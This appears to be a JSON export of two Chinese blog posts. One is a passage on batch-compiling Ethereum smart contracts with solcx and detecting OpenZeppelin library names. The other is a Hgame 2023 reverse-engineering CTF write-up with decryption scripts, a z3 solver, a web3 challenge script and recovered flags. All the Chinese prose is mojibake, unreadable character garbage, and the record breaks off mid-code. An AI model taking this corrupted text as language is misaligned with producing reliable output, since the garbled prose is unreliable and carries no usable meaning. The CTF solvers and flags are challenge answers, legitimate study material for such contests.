çš„ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–æ‰€æœ‰ä¸Šè¿°å…³é”®è¯ååº“çš„åç§° ç„¶è€Œæˆ‘ä»¬æå–åˆ°è¿™äº›åº“çš„åç§°ä¹‹åï¼Œè¦æ€ä¹ˆçŸ¥é“è¿™äº›åº“æ˜¯å…¬å¼€åº“å‘¢ï¼Ÿè¦çŸ¥é“å®šä¹‰ä¸»åˆçº¦ä¾‹å¦‚ä¸Šè¿°ç¤ºä¾‹ä¸­çš„ AuctionPotato å‰é¢çš„å…³é”®å­—ä¹Ÿæ˜¯ contract å‘€ è¿™æ—¶æˆ‘æƒ³åˆ° openzeppelin-contracts ä¸æ˜¯ä¿å­˜äº†ç»å¤§å¤šæ•°æ™ºèƒ½åˆçº¦çš„å…¬å¼€åº“å—ï¼Ÿé‚£æˆ‘åˆ¤æ–­æå–åˆ°çš„åˆçº¦åç§°æ˜¯å¦åœ¨å…¬å¼€åº“åç§°çš„åˆ—è¡¨ä¸­ï¼Œä¸å°±å¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯å…¬å¼€åº“äº†å˜› å®ç°å¦‚ä¸‹ import osimport re def ReadLibraryName(): LibraryPath = r\"E:\\solidity\\æ™ºèƒ½åˆçº¦Libraryçš„è¯†åˆ«å’Œç›¸ä¼¼åº¦åˆ†æ\\openzeppelin-contracts-master\\contracts\" L = [] for dirpath, dirnames, filenames in os.walk(LibraryPath): for file in filenames: if os.path.splitext(file)[1] == '.sol': L.append(os.path.join(os.path.splitext(file)[0])) return LLibratyName = ReadLibraryName()# è¯»å–å…¬å¼€åº“åç§°try: with open(f\"&#123;DataDir&#125;\\\\&#123;ContractAddress&#125;\\\\code.sol\", 'r') as f: src = f.readlines()except Exception as e: # print(f\"error during read file!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continueif len(src[0]) > 100: continue# print(ContractAddress)# print(src[0])openSource = []for line in src: matchLib = re.search(r\"^library\\s+(\\w+)\\s*\", line)# å®šä¹‰ä¸º library ç±»å‹çš„åº“ if matchLib: T = matchLib.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchContract = re.search(r\"^contract\\s+(\\w+)\\s*\", line)# å®šä¹‰ä¸º contract ç±»å‹çš„åº“ if matchContract: T = matchContract.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchInterface = re.search(r\"^interface\\s+(\\w+)\\s*\", line)# å®šä¹‰ä¸º interface ç±»å‹çš„åº“ if matchInterface: T = matchInterface.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\")# å¦‚ä½•æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦å¹¶ç”Ÿæˆå­—èŠ‚ç ï¼Ÿ è¿™äº”ä¸‡å¤šä¸ªæ™ºèƒ½åˆçº¦ï¼Œæ¯ä¸ªåˆçº¦æ‰€éœ€çš„ç¼–è¯‘ç‰ˆæœ¬éƒ½ä¸ç›¸åŒï¼Œæ‰€ä»¥ç›´æ¥ç”¨ solc å‘½ä»¤å»ç¼–è¯‘æ¯«æ— ç–‘é—®æ˜¯ä¼šæŠ¥é”™çš„ è¿™æ—¶ï¼Œæˆ‘å‘ç° python ä¸­çš„ solcx å¯ä»¥åˆ‡æ¢ solc ç‰ˆæœ¬å¹¶è¿›è¡Œç›¸åº”çš„ç¼–è¯‘ # solcx å®‰è£… pip install py-solc-xç„¶ååœ¨é¡¹ç›®ä¸­ä½¿ç”¨ import solcx å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº† æƒ³è¦æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„ä¿¡æ¯æœ‰ ç¼–è¯‘å™¨çš„ç‰ˆæœ¬ æ‰€ç¼–è¯‘çš„æ™ºèƒ½åˆçº¦åç§° å¾ˆå¹¸è¿ï¼Œæˆ‘ä»¬éœ€è¦çš„è¿™ä¸¤ä¸ªä¿¡æ¯åœ¨ info æ–‡ä»¶ä¸­éƒ½å«æœ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è¯»å– info ä¸­çš„ä¿¡æ¯å³å¯ with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version)å¦‚æœè¯´æ²¡æœ‰ info å†…æ–‡ä»¶çš„ä¿¡æ¯çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ code.sol æ–‡ä»¶ä¸­æå–å‡ºç¼–è¯‘ç‰ˆæœ¬ ç¤ºä¾‹å¦‚ä¸‹ import refor line in src: matchVersion = re.search(r\"^pragma solidity.*(\\d+\\.\\d+\\.\\d+)\", line) if matchVersion: Version = matchVersion.group(1)æ•…æ‰¹é‡ç¼–è¯‘æ™ºèƒ½åˆçº¦å¹¶ç”Ÿæˆå­—èŠ‚ç çš„ä»£ç å¦‚ä¸‹ def bytecodeMaker(ContractAddress): src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version) with open(f\"&#123;src_folder&#125;\\\\code.sol\", \"r\") as file: code = file.read() # ç¼–è¯‘åˆçº¦ install_solc(version)# é€‰æ‹©ç¼–è¯‘å™¨ç‰ˆæœ¬ compiled_sol = compile_standard( &#123; \"language\": \"Solidity\", \"sources\": &#123;\"code.sol\": &#123;\"content\": code&#125;&#125;, \"settings\": &#123; \"outputSelection\": &#123; \"*\": &#123;\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]&#125; &#125; &#125;, &#125;, solc_version=version, ) bytecode = compiled_sol[\"contracts\"][\"code.sol\"][contract_name][\"evm\"][\"bytecode\"][\"object\"] # print(bytecode) # with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as f: # f.write(bytecode) return bytecode# 0x03 æ‰§è¡Œè¿‡ç¨‹ä¸­çš„é—®é¢˜ å½“æˆ‘çš„ä»£ç å†™å¥½ä¹‹åï¼Œæˆ‘å‘ç°åœ¨å¤„ç†å…«åƒå¤šä»½åˆçº¦å·¦å³çš„æ—¶å€™ï¼Œç¨‹åºå°†ä¼šæŠ¥é”™å¹¶æ— æ³•æ­£å¸¸çš„è¿›è¡Œåç»­çš„å¤„ç†ï¼ŒæŠ¥é”™å†…å®¹ä¸º [Errno24] Too many open files åœ¨ç½‘ä¸ŠæŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œä½†æ˜¯éƒ½å¤§ç›¸å¾„åº­çš„è¡¨ç¤ºæ˜¯æ‰“å¼€æ–‡ä»¶åæ²¡æœ‰æ­£å¸¸çš„å…³é—­ï¼Œä½†æ˜¯æˆ‘åå¤ç ”ç©¶ä»£ç ï¼Œå‘ç°è‡ªå·±æ‰“å¼€æ–‡ä»¶çš„æ“ä½œç”¨çš„éƒ½æ˜¯ with open , æ ¹æœ¬ä¸å¯èƒ½å‡ºç°è¿™ç§æƒ…å†µ æœ€ç»ˆé€šè¿‡æ‰“å°è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æ‰æ˜ç™½æ˜¯ solc çš„é—®é¢˜ def printProess(): # è·å–å½“å‰è¿›ç¨‹çš„ ID pid = psutil.Process().pid # è·å–è¿›ç¨‹å¥æŸ„ä¿¡æ¯ process = psutil.Process(pid) open_files = process.open_files() # æ‰“å°æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ä¿¡æ¯ print(f\"å·²æ‰“å¼€çš„å¥æŸ„æ•°é‡&#123;len(open_files)&#125;\") for file in open_files: print(file.path) ä½†æ˜¯æˆ‘åœ¨ StackOverflow æœç´¢äº†å¾ˆä¹…ï¼Œéƒ½ä¸çŸ¥é“ python éœ€è¦ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥å…³é—­æ‰“å¼€çš„æ–‡ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„æé—®å’Œè§£ç­”éƒ½æ˜¯å…³äºå¦‚ä½•å…³é—­è¿›ç¨‹çš„ï¼Œå³ä½¿ç”¨ process.kill() æ¥ç»ˆæ­¢è¿›ç¨‹ ç»ˆäºï¼Œç»è¿‡ä¸‹åˆçš„ç ”ç©¶ï¼Œæˆ‘å‘ç°å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œæ¥åˆ†æ‰¹æ¬¡çš„ç¼–è¯‘å¤§é‡çš„æ™ºèƒ½åˆçº¦ äºæ˜¯å¾ˆå¿«æˆ‘å†™å‡ºäº†ä¸»ä½“ä»£ç  # runME.pyimport osDataDir = r\".\\etherscan\"DataDir_sum = len(os.listdir(DataDir))step = 3000# ä¸€æ¬¡å¤„ç† 3000 ä¸ªåˆçº¦round=0for startPos in range(0, DataDir_sum, step): round=round+1 print(f\"======round&#123;round&#125;======\") endPos = startPos + step if endPos &lt; DataDir_sum: os.system(f\"python .\\deal.py &#123;startPos&#125; &#123;endPos&#125;\") else: os.system(f\"python .\\deal.py &#123;startPos&#125; &#123;DataDir_sum&#125;\")å½“ç„¶ä¹Ÿéœ€è¦åœ¨ deal.py ä¸­å¢æ·»æ¥å—å‘½ä»¤è¡Œå‚æ•°çš„è¯­å¥ # deal.pyif len(sys.argv) != 3: print('please enter 2 argv!') exit(-1)startPos, endPos = sys.argv[1:3]startPos, endPos = int(startPos), int(endPos)# 0x04 å¤„ç†å®Œæˆ å®Œæ•´ä»£ç å¦‚ä¸‹ # deal.pyimport osimport refrom solcx import compile_standard, install_solcimport sysdef ReadLibraryName(): LibraryPath = r\"E:\\solidity\\æ™ºèƒ½åˆçº¦Libraryçš„è¯†åˆ«å’Œç›¸ä¼¼åº¦åˆ†æ\\openzeppelin-contracts-master\\contracts\" L = [] for dirpath, dirnames, filenames in os.walk(LibraryPath): for file in filenames: if os.path.splitext(file)[1] == '.sol': L.append(os.path.join(os.path.splitext(file)[0])) return Ldef bytecodeMaker(ContractAddress): src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version) with open(f\"&#123;src_folder&#125;\\\\code.sol\", \"r\") as file: code = file.read() install_solc(version) compiled_sol = compile_standard( &#123; \"language\": \"Solidity\", \"sources\": &#123;\"code.sol\": &#123;\"content\": code&#125;&#125;, \"settings\": &#123; \"outputSelection\": &#123; \"*\": &#123;\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]&#125; &#125; &#125;, &#125;, solc_version=version, ) bytecode = compiled_sol[\"contracts\"][\"code.sol\"][contract_name][\"evm\"][\"bytecode\"][\"object\"] # print(bytecode) # with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as f: # f.write(bytecode) return bytecodedef copy_files(src_folder, dst_folder): os.makedirs(dst_folder) for root, dirs, files in os.walk(src_folder): for file in files: src_file = os.path.join(root, file) dst_file = os.path.join(dst_folder, os.path.relpath(src_file, src_folder)) # print(dst_file) # print(os.path.dirname(dst_file)) # shutil.copy2(src_file, dst_file) with open(src_file, 'r') as f: text = f.read() with open(dst_file, 'w') as f: f.write(text)if len(sys.argv) != 3: print('please enter 2 argv!') exit(-1)startPos, endPos = sys.argv[1:3]startPos, endPos = int(startPos), int(endPos)LibratyName = ReadLibraryName()# print(LibratyName)DataDir = r\".\\etherscan\"DataDir_sum = endPos - startPos# print(DataDir)for i in range(startPos, endPos): ContractAddress = os.listdir(DataDir)[i] print(f\"å¾…å¤„ç†åˆçº¦æ•°:&#123;DataDir_sum&#125;\\x1B[1A\\x1B[K\") DataDir_sum = DataDir_sum - 1 try: with open(f\"&#123;DataDir&#125;\\\\&#123;ContractAddress&#125;\\\\code.sol\", 'r') as f: src = f.readlines() except Exception as e: # print(f\"error during read file!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continue if len(src[0]) > 100: continue # print(ContractAddress) # print(src[0]) openSource = [] for line in src: matchLib = re.search(r\"^library\\s+(\\w+)\\s*\", line) if matchLib: T = matchLib.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchContract = re.search(r\"^contract\\s+(\\w+)\\s*\", line) if matchContract: T = matchContract.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchInterface = re.search(r\"^interface\\s+(\\w+)\\s*\", line) if matchInterface: T = matchInterface.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") # print(openSource) if openSource: # print(openSource) # print(ContractAddress) src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" try: bytecode = bytecodeMaker(ContractAddress) except Exception as e: # print(f\"error during bytecode!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continue copy_files(src_folder, dst_folder) with open(f\"&#123;dst_folder&#125;\\\\PublicLibrary\", 'w') as ff: ff.write(str(openSource)) with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as ff: ff.write(str(bytecode))å¤„ç†å®Œæˆï¼ # 0x05 æœ‰è¶£çš„å°çŸ¥è¯† å½“æˆ‘æƒ³è¦çŸ¥é“è¿˜å‰©ä¸‹å¤šå°‘æ–‡ä»¶éœ€è¦å¤„ç†çš„æ—¶å€™ï¼Œæ€»æ˜¯è‹¦äºè¾“å‡ºçš„åˆ·å± æ¯”å¦‚ä¸‹é¢çš„ä»£ç  import timeprint(\"ä»£ç å¼€å§‹æ‰§è¡Œ!\")for i in range(10000, 1, -1): print(f\"è¿˜å‰©ä¸‹&#123;i&#125;ä¸ªæ–‡ä»¶éœ€è¦å¤„ç†\") time.sleep(0.5) è¿™æ ·è¾“å‡ºä¼šå¯¼è‡´åˆ·å±çœ‹èµ·æ¥ååˆ†ä¸èˆ’æœ ä½†æ˜¯æˆ‘ä»¬åªè¦åœ¨è¾“å‡ºåé¢åŠ ä¸Š \\x1B[1A\\x1B[K å˜æˆä¸‹é¢è¿™ç§å½¢å¼ import timeprint(\"ä»£ç å¼€å§‹æ‰§è¡Œ!\")for i in range(10000,1,-1): print(f\"è¿˜å‰©ä¸‹&#123;i&#125;ä¸ªæ–‡ä»¶éœ€è¦å¤„ç†\\x1B[1A\\x1B[K\") time.sleep(0.5)è¿™æ ·å°±æ²¡æœ‰åˆ·å±çš„å›°æ‰°äº† è‡³äºåŸç†ä½¿ç”¨çš„æ˜¯ ANSI ç»ˆç«¯æ§åˆ¶åºåˆ— \\x1b[nA è¡¨ç¤ºå…‰æ ‡ä¸Šç§» \\x1b[2K è¡¨ç¤ºæ“¦é™¤å½“å‰è¡Œ æ‰€ä»¥ \\x1B[1A\\x1B[K ç»„åˆèµ·æ¥å°±èƒ½æŠŠè¿™ä¸€è¡Œæ¸…é™¤å•¦ æˆ–è€…ç½‘ä¸Šè¿˜æœ‰æ–¹æ³•å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç  import timeprint(\"ä»£ç å¼€å§‹æ‰§è¡Œ!\")for i in range(10000,1,-1): print(f\"è¿˜å‰©ä¸‹&#123;i&#125;ä¸ªæ–‡ä»¶éœ€è¦å¤„ç†\", end='\\r') time.sleep(0.5)åŒæ ·å¯ä»¥å®ç°åˆ·æ–°å½“å‰è¡Œçš„æ“ä½œ ä½†æ˜¯ä»¤æˆ‘æ„Ÿåˆ°å¥‡æ€ªçš„æ˜¯ï¼Œæ— è®ºæ˜¯ \\x1B[1A\\x1B[K è¿˜æ˜¯ end='\\r' , éƒ½æ— æ³•åœ¨ pycharm ä¸­åˆ·æ–°å½“å‰è¡Œ ç»ˆäºæˆ‘å‘ç°äº†å®Œç¾çš„åˆ·æ–°è¾“å‡ºè¡Œçš„æ–¹å¼ï¼ å°±æ˜¯è¿™ç§å†™æ³• import timeprint(\"ä»£ç å¼€å§‹æ‰§è¡Œ!\")for i in range(10000,1,-1): print(f\"\\rè¿˜å‰©ä¸‹&#123;i&#125;ä¸ªæ–‡ä»¶éœ€è¦å¤„ç†\",end='') time.sleep(0.5) å®Œç¾åœ¨ pycharm ä¸­è¾“å‡ºï½","categories":[],"tags":[{"name":"æ™ºèƒ½åˆçº¦","slug":"æ™ºèƒ½åˆçº¦","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"åŒºå—é“¾","slug":"åŒºå—é“¾","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"æ‰¹é‡ç¼–è¯‘","slug":"æ‰¹é‡ç¼–è¯‘","permalink":"https://oacia.dev/tags/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91/"},{"name":"æå–å…¬å¼€åº“","slug":"æå–å…¬å¼€åº“","permalink":"https://oacia.dev/tags/%E6%8F%90%E5%8F%96%E5%85%AC%E5%BC%80%E5%BA%93/"}]},{"title":"Hgame2023 é€†å‘ writeup","slug":"hgame2023-reverse-writeup","date":"2023-02-06T18:51:22.000Z","updated":"2023-09-03T16:46:22.906Z","comments":true,"path":"hgame2023-reverse-writeup/","link":"","permalink":"https://oacia.dev/hgame2023-reverse-writeup/","excerpt":"","text":"æŠŠä»Šå¹´ hgame å››å‘¨çš„é€†å‘é¢˜ ak å•¦ï¼Œè¿˜æ‹¿äº†ä¸ªé€†å‘å•æ–¹å‘å¥–å‘¢ï½(â—â€™â—¡â€™â—), é¡ºæ‰‹åšäº†ä¸¤é“åŒºå—é“¾çš„é¢˜ï¼š) é¢˜ç›®é™„ä»¶: ç‚¹å‡»ä¸‹è½½ # week1 # a_cup_of_tea tea ç®—æ³• from ctypes import *def decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * -32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value += delta return v0.value, v1.value# testif __name__ == \"__main__\": # å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ® value = [0, 0] buf2 = [0x2E63829D, 0xC14E400F, 0x9B39BFB9, 1512016660, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6] # buf2=[0x9D82632E, 0x0F404EC1, 0x9B39BFB9, 1512016660, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6] # å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bit key = [0x12345678, 0x23456789, 0x34567890, 0x45678901] for i in range(0, len(buf2), 2): value[0], value[1] = buf2[i], buf2[i + 1] res = decrypt(value, key) bytearray.fromhex(hex(res[0])[2::]).decode() print(bytearray.fromhex(hex(res[0])[2::]).decode()[::-1], bytearray.fromhex(hex(res[1])[2::]).decode()[::-1], sep='', end='') print('k&#125;', end='')# hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;# easyasm a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]for i in a: print(chr(i^0x33),end='')# hgame&#123;welc0me_t0_re_wor1d!&#125;# easyenc a = [0x04, 0xFF, 0xFD, 0x09, 0x01, 0xF3, 0xB0, 0x00, 0x00, 0x05, 0xF0, 0xAD, 0x07, 0x06, 0x17, 0x05, 0xEB, 0x17, 0xFD, 0x17, 0xEA, 0x01, 0xEE, 0x01, 0xEA, 0xB1, 0x05, 0xFA, 0x08, 0x01, 0x17, 0xAC, 0xEC, 0x01, 0xEA, 0xFD, 0xF0, 0x05, 0x07, 0x06, 0xF9]for i in a: if i > 0xA0: i=-(0xff-i+1) print(chr((i + 86) ^ 0x32), end='')# hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;# encode v4=[0x00000008, 0x00000006, 0x00000007, 0x00000006, 0x00000001, 0x00000006, 0x0000000D, 0x00000006, 0x00000005, 0x00000006, 0x0000000B, 0x00000007, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000003, 0x00000006, 0x0000000F, 0x00000006, 0x00000004, 0x00000006, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000009, 0x00000006, 0x00000003, 0x00000007, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x00000001, 0x00000006, 0x00000003, 0x00000007, 0x00000009, 0x00000007, 0x0000000F, 0x00000005, 0x00000006, 0x00000006, 0x0000000F, 0x00000006, 0x00000002, 0x00000007, 0x0000000F, 0x00000005, 0x00000001, 0x00000006, 0x0000000F, 0x00000005, 0x00000002, 0x00000007, 0x00000005, 0x00000006, 0x00000006, 0x00000007, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x00000003, 0x00000007, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000007, 0x00000006, 0x00000009, 0x00000006, 0x0000000E, 0x00000006, 0x00000005, 0x00000006, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x0000000D, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]for i in range(50): print(chr((v4[2 * i + 1] &lt;&lt; 4) | v4[2 * i]),end='')# hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;# test_your_IDA ida æ‰“å¼€è·å¾— flag hgame # Checkin(BlockChain) çœ‹çœ‹æºç  // SPDX-License-Identifier: MITpragma solidity 0.8.17;contract Checkin &#123; string greeting; constructor(string memory _greeting) &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = \"HelloHGAME!\"; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125;[+] deployer account: 0x5B9E13374B97E1B1633dfAa4c36A80CA1655CA4a[+] token: v4.local.R3OAQ2ikgeB8XRLjt8bggKUnkbwMGMlv_mSRXwxmGUDuClnl2FqmeIZn1cZF9jGB8lW9YnyI2GHlI2Tc_Z4s-auW0mQri4SpuBN3HmrPyoYJNoj5eHgCE93i5sw1jxQhkAk-vc82sQCz82FTYgOElp93TYykIQR9EIItY49C66__Yg[+] contract address: 0x34D0aCD466A0f208e57722D4aF80479A047B3271[+] transaction hash: 0xd2a3e46e1dd201c49325a2c819568229dc31801f6550eb8db7a3af6c77796e93ç®€å•çš„åŒºå—é“¾é¢˜ç›®ï¼Œäº¤äº’ä¸€ä¸‹å°±æœ‰ flag äº† import jsonimport timefrom web3 import Web3, HTTPProvidercontract_address = '0x34D0aCD466A0f208e57722D4aF80479A047B3271'private_key = [ä½ çš„é’±åŒ…ç§é’¥]wallet = Web3.toChecksumAddress([ä½ çš„é’±åŒ…åœ°å€])w3 = Web3(HTTPProvider('http://week-1.hgame.lwsec.cn:32663'))ABI = json.loads( '[&#123;\"inputs\":[&#123;\"internalType\":\"string\",\"name\":\"_greeting\",\"type\":\"string\"&#125;],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"&#125;,&#123;\"inputs\":[],\"name\":\"greet\",\"outputs\":[&#123;\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"&#125;],\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[&#123;\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"&#125;],\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"inputs\":[&#123;\"internalType\":\"string\",\"name\":\"_greeting\",\"type\":\"string\"&#125;],\"name\":\"setGreeting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"&#125;]')# w3.eth.enable_unaudited_features()contract = w3.eth.contract(address=contract_address, abi=ABI)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('10', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet&#125;transaction = contract.functions.setGreeting(\"HelloHGAME!\").buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)# week2 # before_main import stringres = string.printablea='qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK'a=[ord(i) for i in a]v6 = 'AMHo7dLxUEabf6Z3PdWr6cOy75i4fdfeUzL17kaV7rG='for i in range(0, len(v6), 4): for xx in res: for yy in res: for zz in res: x, y, z = ord(xx), ord(yy), ord(zz) if ord(v6[i]) == a[x >> 2] and ord(v6[i + 1]) == a[(16 * x) &amp; 0x30 | (y >> 4)] and ord(v6[i + 2]) == a[(4 * y) &amp; 0x3C | (z >> 6)] and ord(v6[i + 3]) == a[z &amp; 0x3F]: print(xx, yy, zz, sep='',end='')print('n&#125;') # ä¸ºäº†è¿æ¥æˆå®Œæ•´çš„ flagï¼Œæ‰€ä»¥çŒœä¸€ä¸ªæœ«å°¾æ˜¯ n&#125;# hgame&#123;s0meth1ng_run_befOre_m@in&#125;# math è§£ä¸ªæ–¹ç¨‹ from z3 import *v10 = [0x0000007E, 0x000000E1, 0x0000003E, 0x00000028, 0x000000D8, 0x000000FD, 0x00000014, 0x0000007C, 0x000000E8, 0x0000007A, 0x0000003E, 0x00000017, 0x00000064, 0x000000A1, 0x00000024, 0x00000076, 0x00000015, 0x000000B8, 0x0000001A, 0x0000008E, 0x0000003B, 0x0000001F, 0x000000BA, 0x00000052, 0x0000004F]v12 = [0x0000F9FE, 0x00008157, 0x000108B2, 0x0000D605, 0x0000F21B, 0x00010FF3, 0x00009146, 0x00011212, 0x0000CF76, 0x00010C46, 0x0000F76B, 0x000077DF, 0x000103BE, 0x0000C6F8, 0x0000ED8A, 0x0000BE90, 0x000075EC, 0x0000EAC8, 0x0000AE37, 0x0000CC29, 0x0000A828, 0x00005C6C, 0x0000AB4A, 0x0000836E, 0x0000ACEE]flag = [Int('flag%d' % i) for i in range(40)]solver = Solver()for i in range(5): for j in range(5): solver.add(v12[5 * i + j]==flag[5 * i + 0]*v10[5 * 0 + j] + flag[5 * i + 1]*v10[5 * 1 + j] + flag[5 * i + 2]*v10[5 * 2 + j] + flag[5 * i + 3]*v10[5 * 3 + j] + flag[5 * i + 4]*v10[5 * 4 + j])if solver.check() == sat: m = solver.model() # print(m) for i in range(len(m)): print(chr(int(str(m[flag[i]]))),end='')else: print('unsat')# hgame&#123;y0ur_m@th_1s_gO0d&#125;# stream PS D:\\hgame\\week2 2023\\stream\\stream> python D:\\TOOLS\\pythoné€†å‘\\pyinstxtractor-master\\pyinstxtractor-master\\pyinstxtractor.py \"D:\\hgame\\week2 2023\\stream\\stream\\stream.exe\"[+] Processing D:\\hgame\\week2 2023\\stream\\stream\\stream.exe[+] Pyinstaller version: 2.1+[+] Python version: 3.10[+] Length of package: 5507205 bytes[+] Found 61 files in CArchive[+] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap.pyc[+] Possible entry point: pyi_rth_inspect.pyc[+] Possible entry point: stream.pyc[+] Found 97 files in PYZ archive[+] Successfully extracted pyinstaller archive: D:\\hgame\\week2 2023\\stream\\stream\\stream.exeYou can now use a python decompiler on the pyc files within the extracted directoryç„¶åç”¨åœ¨çº¿å·¥å…·æŠŠ steam.pyc è½¬æˆ py #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.10import base64def gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key): result = '' for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) result = base64.b64encode(result.encode()).decode() return resulttext = input('Flag: ')key = 'As_we_do_as_you_know'enc = encrypt(text, key)if enc == 'wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl': print('yes!') return NoneNone('try again...')exp: #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.10import base64def 